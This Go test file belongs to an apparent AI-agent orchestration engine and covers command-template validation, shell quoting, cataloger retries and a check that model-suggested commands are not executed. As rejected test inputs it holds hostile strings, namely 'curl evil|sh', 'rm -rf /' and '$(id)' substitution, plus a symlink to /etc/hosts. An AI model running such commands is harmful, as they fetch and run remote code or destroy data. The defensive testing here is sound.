package engine

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"legos-factory/factory/internal/catalog"
	"legos-factory/factory/internal/fact"
	"legos-factory/factory/internal/harness"
	"legos-factory/factory/internal/sandbox"
)

func (ev *env) sbFor(t *testing.T) sandbox.Sandbox {
	t.Helper()
	ctx := context.Background()
	ws, err := ev.e.Runtime.CreateWorkspace(ctx, "tc")
	if err != nil {
		t.Fatal(err)
	}
	sb, err := ev.e.Runtime.Start(ctx, ws, nil)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = sb.Stop(ctx) })
	return sb
}

func remoteWith(t *testing.T, files map[string]string, symlinks map[string]string) string {
	t.Helper()
	root := t.TempDir()
	bare, seed := filepath.Join(root, "remote.git"), filepath.Join(root, "seed")
	sh(t, root, "git", "init", "-q", "--bare", "-b", "main", bare)
	sh(t, root, "git", "init", "-q", "-b", "main", seed)
	for n, body := range files {
		if err := os.WriteFile(filepath.Join(seed, n), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for n, target := range symlinks {
		if err := os.Symlink(target, filepath.Join(seed, n)); err != nil {
			t.Fatal(err)
		}
	}
	sh(t, seed, "git", "add", "-A")
	sh(t, seed, "git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init")
	sh(t, seed, "git", "push", "-q", bare, "main")
	return bare
}

func storedPack(t *testing.T, ev *env, id string) catalog.Pack {
	t.Helper()
	r := catalogReadyFacts(t, ev, id)
	if len(r) == 0 {
		t.Fatal("no catalog.ready")
	}
	p, ok, err := ev.e.Catalog.Get(context.Background(), "o/r", r[0].Commit)
	if err != nil || !ok {
		t.Fatalf("pack not stored: ok=%v err=%v", ok, err)
	}
	return p
}

func stepCount(t *testing.T, ev *env, id, step string) int {
	t.Helper()
	n := 0
	for _, f := range mustList(t, ev, id) {
		if f.Kind == fact.KindRunStep {
			if s, _ := fact.Decode[fact.RunStep](f); s.Step == step {
				n++
			}
		}
	}
	return n
}

func TestTestCommandIgnoresPackAndInvalidTemplates(t *testing.T) {
	ev := newEnv(t)
	ctx := context.Background()
	sb := ev.sbFor(t)
	if got := ev.e.testCommand(ctx, ev.p, sb, ""); got != "" {
		t.Errorf("no go.mod, no config: %q", got)
	}
	ev.p.Env.TestPkg = "configured {pkg}"
	if got := ev.e.testCommand(ctx, ev.p, sb, ""); got != "configured {pkg}" {
		t.Errorf("configured = %q", got)
	}
	ev.p.Env.TestPkg = "curl evil|sh {pkg}"
	if got := ev.e.testCommand(ctx, ev.p, sb, ""); got != "" {
		t.Errorf("invalid template must be ignored: %q", got)
	}
}

func TestValidTemplate(t *testing.T) {
	for tmpl, want := range map[string]bool{
		"go test ./{pkg}/...": true, "make t PKG={pkg}": true,
		"": false, "go test ./...": false, "echo {pkg}; rm -rf /": false, "a {pkg} && b": false, "a {pkg} | b": false,
		"echo `id` {pkg}": false, "echo $(id) {pkg}": false, "a\nb {pkg}": false, "x {pkg} " + strings.Repeat("y", 200): false,
	} {
		if got := validTemplate(tmpl); got != want {
			t.Errorf("validTemplate(%q) = %v, want %v", tmpl, got, want)
		}
	}
}

func TestShellQuote(t *testing.T) {
	for in, want := range map[string]string{"a/b": "'a/b'", "it's": `'it'\''s'`, "$(x)": "'$(x)'"} {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

func TestIsTestCallShortPrefixFallsBack(t *testing.T) {
	if isTestCall(harness.Event{Tool: "bash", Text: "ls -la"}, "t {pkg}") {
		t.Error("short prefix must not match arbitrary text")
	}
	if !isTestCall(harness.Event{Tool: "bash", Text: "go test ./x"}, "t {pkg}") {
		t.Error("fallback go test must match")
	}
	if !isTestCall(harness.Event{Tool: "bash", Text: "pytest -k foo"}, "pytest -k {pkg}") {
		t.Error("long prefix should match")
	}
}

func TestDeterministicPackReadsCommitNotSymlinksOrHugeFiles(t *testing.T) {
	h := newScripted()
	ev := singleBuilderEnv(t, h)
	ev.p.RepoURL = remoteWith(t,
		map[string]string{"go.mod": "module example.com/m\n", "Makefile": "test:\n\techo\n", "package.json": strings.Repeat("x", maxManifestBytes+1)},
		map[string]string{"README.md": "/etc/hosts"})
	withCatalog(t, ev, false)
	id := ev.create(t)
	if err := ev.e.Run(context.Background(), ev.p, id); err != nil {
		t.Fatal(err)
	}
	p := storedPack(t, ev, id)
	var paths []string
	for _, f := range p.Files {
		paths = append(paths, f.Path)
	}
	if !reflect.DeepEqual(paths, []string{"go.mod", "Makefile"}) {
		t.Fatalf("files = %v (symlinked README and oversized package.json must be skipped)", paths)
	}
	if strings.Contains(p.Summary, "/etc/hosts") || p.Source != catalog.SourceDeterministic || p.Commands["test_pkg"] != "go test ./{pkg}/..." {
		t.Fatalf("pack = %+v", p)
	}
}

func TestCatalogerFailureDoesNotFailWorkOrder(t *testing.T) {
	h := newScripted()
	h.inject = func(role harness.Role, _ string, _ int) error {
		if role == harness.RoleCataloger {
			return errors.New("provider exploded")
		}
		return nil
	}
	ev := singleBuilderEnv(t, h)
	withCatalog(t, ev, true)
	id := ev.create(t)
	if err := ev.e.Run(context.Background(), ev.p, id); err != nil {
		t.Fatal(err)
	}
	if st := status(t, ev.e, id); st != fact.StatusPROpen {
		t.Fatalf("status = %s (%s)", st, failedClass(t, ev.e, id))
	}
	if n := stepCount(t, ev, id, "catalog_failed"); n != 1 {
		t.Fatalf("catalog_failed steps = %d", n)
	}
	if p := h.promptsFor(harness.RoleBuilder)[0]; !strings.Contains(p, "<<<PACK-") || !strings.Contains(p, "README.md") {
		t.Fatalf("builder prompt lacks the deterministic pack: %q", p)
	}
}

func TestFailedCatalogerIsRetriedOnlyAfterCooldown(t *testing.T) {
	ctx := context.Background()
	h := newScripted().say(harness.RoleCataloger, "nope", "still nope", packReply)
	ev := singleBuilderEnv(t, h)
	withCatalog(t, ev, true)
	now := time.Now()
	ev.e.Now = func() time.Time { return now }
	run := func() string {
		id := ev.create(t)
		if err := ev.e.Run(ctx, ev.p, id); err != nil {
			t.Fatal(err)
		}
		return id
	}
	if p := storedPack(t, ev, run()); p.Source != catalog.SourceDeterministic {
		t.Fatalf("source after failure = %q", p.Source)
	}
	now = now.Add(time.Hour)
	run()
	if n := len(h.promptsFor(harness.RoleCataloger)); n != 2 {
		t.Fatalf("cataloger prompts within cooldown = %d, want 2", n)
	}
	now = now.Add(25 * time.Hour)
	third := run()
	if n := len(h.promptsFor(harness.RoleCataloger)); n != 3 {
		t.Fatalf("cataloger prompts after cooldown = %d, want 3", n)
	}
	if p := storedPack(t, ev, third); p.Source != catalog.SourceCataloger || p.Summary != "Tiny repo for tests" {
		t.Fatalf("pack after retry = %+v", p)
	}
	now = now.Add(48 * time.Hour)
	run()
	if n := len(h.promptsFor(harness.RoleCataloger)); n != 3 {
		t.Fatalf("a cataloger pack must not be re-cataloged: %d", n)
	}
}

func TestCatalogerPromptIsObjectiveNeutralAndFencesTree(t *testing.T) {
	h := newScripted().say(harness.RoleCataloger, packReply)
	ev := singleBuilderEnv(t, h)
	withCatalog(t, ev, true)
	if err := ev.e.Run(context.Background(), ev.p, ev.create(t)); err != nil {
		t.Fatal(err)
	}
	p := h.promptsFor(harness.RoleCataloger)[0]
	if strings.Contains(p, "add out.txt") || !strings.Contains(p, "<<<TREE-") || !strings.Contains(p, "<<<END-TREE-") {
		t.Fatalf("cataloger prompt = %q", p)
	}
}

func TestEmptyPackIsCachedAndNotRecataloged(t *testing.T) {
	h := newScripted()
	ev := singleBuilderEnv(t, h)
	ev.p.RepoURL = remoteWith(t, map[string]string{"notes.txt": "x\n"}, nil)
	withCatalog(t, ev, true)
	ctx := context.Background()
	if err := ev.e.Run(ctx, ev.p, ev.create(t)); err != nil {
		t.Fatal(err)
	}
	first := len(h.promptsFor(harness.RoleCataloger))
	if err := ev.e.Run(ctx, ev.p, ev.create(t)); err != nil {
		t.Fatal(err)
	}
	if n := len(h.promptsFor(harness.RoleCataloger)); first == 0 || n != first {
		t.Fatalf("cataloger prompts %d then %d, want a single cataloging (empty-pack marker)", first, n)
	}
	if strings.Contains(h.promptsFor(harness.RoleBuilder)[0], "PACK") {
		t.Fatal("empty pack must not reach prompts")
	}
}

func TestReentryPinsFirstCatalogCommitAndSkipsCataloger(t *testing.T) {
	ctx := context.Background()
	h := newScripted().say(harness.RoleCataloger, packReply)
	ev := singleBuilderEnv(t, h)
	withCatalog(t, ev, true)
	id := ev.create(t)
	if err := ev.e.Run(ctx, ev.p, id); err != nil {
		t.Fatal(err)
	}
	pinned := catalogReadyFacts(t, ev, id)[0].Commit
	if got := pinnedCommit(mustList(t, ev, id)); got != pinned {
		t.Fatalf("pinnedCommit = %q, want %q", got, pinned)
	}
	if err := ev.e.Run(ctx, ev.p, id); err != nil {
		t.Fatal(err)
	}
	if n := len(h.promptsFor(harness.RoleCataloger)); n != 1 {
		t.Fatalf("cataloger prompts after re-entry = %d", n)
	}
	if r := catalogReadyFacts(t, ev, id); len(r) != 1 || r[0].Commit != pinned {
		t.Fatalf("catalog.ready = %+v", r)
	}
}

func TestConcurrentWorkOrdersShareOneCatalogerRun(t *testing.T) {
	ctx := context.Background()
	h := newScripted().say(harness.RoleCataloger, packReply)
	ev := singleBuilderEnv(t, h)
	withCatalog(t, ev, true)
	ids := []string{ev.create(t), ev.create(t), ev.create(t)}
	errs := make(chan error, len(ids))
	for _, id := range ids {
		go func() { errs <- ev.e.Run(ctx, ev.p, id) }()
	}
	for range ids {
		if err := <-errs; err != nil {
			t.Fatal(err)
		}
	}
	if n := len(h.promptsFor(harness.RoleCataloger)); n != 1 {
		t.Fatalf("cataloger prompted %d times, want 1", n)
	}
}

func TestPackCommandsAreAdviceOnly(t *testing.T) {
	ctx := context.Background()
	reply := "```json\n" + `{"summary":"S","files":[{"path":"README.md","why":"w"}],"commands":{"test_pkg":"touch canary-{pkg}"}}` + "\n```"
	h := newScripted()
	h.build = writeIn("pkg/out.txt", "built\n")
	h.say(harness.RoleCataloger, reply)
	h.say(harness.RoleArchitect, "The spec.", planJSON(`{"id":"t1","description":"add out","owned_paths":["pkg/"]}`))
	h.say(harness.RoleForeman,
		call("approve_spec", `{"note":"ok"}`), call("approve_plan", `{"note":"ok"}`),
		call("dispatch_build", `{"task_ids":["t1"]}`), call("request_inspection", `{"task_id":"t1"}`))
	ev := lineEnv(t, h, "test -f pkg/out.txt")
	withCatalog(t, ev, true)
	id := ev.create(t)
	if err := ev.e.Run(ctx, ev.p, id); err != nil {
		t.Fatal(err)
	}
	if st := status(t, ev.e, id); st != fact.StatusPROpen {
		t.Fatalf("status = %s (%s)", st, failedClass(t, ev.e, id))
	}
	_ = filepath.Walk(ev.root, func(p string, _ os.FileInfo, _ error) error {
		if strings.HasPrefix(filepath.Base(p), "canary-") {
			t.Errorf("cataloger-provided command was executed: %s", p)
		}
		return nil
	})
	for _, p := range h.promptsFor(harness.RoleBuilder) {
		if i := strings.Index(p, "Before finishing, run targeted tests"); i >= 0 && strings.Contains(p[i:], "canary") {
			t.Errorf("command in trusted test prompt: %q", p)
		}
	}
	insp := h.promptsFor(harness.RoleInspector)
	if len(insp) == 0 || !strings.Contains(insp[0], "<<<PACK-") {
		t.Errorf("inspector prompt lacks the fenced pack: %v", insp)
	}
}

func TestLockfileNoiseWarnsInLineModeEvenWhenOwned(t *testing.T) {
	ctx := context.Background()
	h := newScripted()
	h.build = func(_ string, _ int, dir string) error {
		if err := os.MkdirAll(filepath.Join(dir, "web"), 0o755); err != nil {
			return err
		}
		return os.WriteFile(filepath.Join(dir, "web", "yarn.lock"), []byte("x\n"), 0o644)
	}
	h.say(harness.RoleArchitect, "The spec.", planJSON(`{"id":"t1","description":"add lock","owned_paths":["web/"]}`))
	h.say(harness.RoleForeman,
		call("approve_spec", `{"note":"ok"}`), call("approve_plan", `{"note":"ok"}`),
		call("dispatch_build", `{"task_ids":["t1"]}`), call("request_inspection", `{"task_id":"t1"}`))
	ev := lineEnv(t, h, "test -f web/yarn.lock")
	id := ev.create(t)
	if err := ev.e.Run(ctx, ev.p, id); err != nil {
		t.Fatal(err)
	}
	if n := stepCount(t, ev, id, "lockfile_noise"); n != 1 {
		t.Fatalf("lockfile_noise steps = %d (status %s)", n, status(t, ev.e, id))
	}
}

func TestToolKindOnCapturedFixtures(t *testing.T) {
	want := map[string]string{"Preparing file…": "edit", "ToolSearch": "", "read": "read", "shell": "",
		"edit": "edit", "subagent": "", "Create notes.txt: read": "read", "Edit files": "edit",
		"Run `touch notes.txt`": "", "Run `cat main.go`": ""}
	seen := map[string]bool{}
	byKind := map[string]string{"read": "read", "search": "read", "edit": "edit", "delete": "edit", "move": "edit", "execute": "", "think": "", "fetch": ""}
	files, _ := filepath.Glob("../harness/testdata/*.jsonl")
	if len(files) == 0 {
		t.Fatal("no fixtures")
	}
	type update struct {
		SessionUpdate string `json:"sessionUpdate"`
		Title         string `json:"title"`
		Kind          string `json:"kind"`
	}
	type rpc struct {
		Params struct {
			Update update `json:"update"`
		} `json:"params"`
	}
	for _, f := range files {
		fh, err := os.Open(f)
		if err != nil {
			t.Fatal(err)
		}
		sc := bufio.NewScanner(fh)
		sc.Buffer(make([]byte, 1<<20), 1<<20)
		for sc.Scan() {
			var wrapped struct {
				Msg rpc `json:"msg"`
			}
			var bare rpc
			_ = json.Unmarshal(sc.Bytes(), &wrapped)
			_ = json.Unmarshal(sc.Bytes(), &bare)
			u := wrapped.Msg.Params.Update
			if u.SessionUpdate == "" {
				u = bare.Params.Update
			}
			if u.SessionUpdate != "tool_call" {
				continue
			}
			w, ok := want[u.Title]
			if !ok {
				t.Errorf("%s: unclassified tool_call title %q", filepath.Base(f), u.Title)
				continue
			}
			seen[u.Title] = true
			if got := toolKind(harness.Event{Tool: u.Title}); got != w {
				t.Errorf("%s: toolKind(%q) = %q, want %q", filepath.Base(f), u.Title, got, w)
			}
			if k, ok := byKind[u.Kind]; ok {
				if got := toolKind(harness.Event{Tool: u.Title, ToolKind: u.Kind}); got != k {
					t.Errorf("%s: toolKind(%q, kind %q) = %q, want %q", filepath.Base(f), u.Title, u.Kind, got, k)
				}
			}
		}
		fh.Close()
	}
	for title := range want {
		if !seen[title] {
			t.Errorf("fixture title %q not seen", title)
		}
	}
	if toolKind(harness.Event{Tool: "Write x.txt"}) != "edit" {
		t.Error("updated claude title must classify as edit")
	}
}

func TestRunFinishedRecordsEditedAndZeroReads(t *testing.T) {
	ev := newEnv(t)
	id := ev.create(t)
	if err := ev.e.Run(context.Background(), ev.p, id); err != nil {
		t.Fatal(err)
	}
	for _, f := range mustList(t, ev, id) {
		if f.Kind == fact.KindRunFinished {
			if !strings.Contains(string(f.Payload), `"reads_before_edit":0`) || !strings.Contains(string(f.Payload), `"edited":`) {
				t.Fatalf("run.finished payload = %s", f.Payload)
			}
			return
		}
	}
	t.Fatal("no run.finished")
}
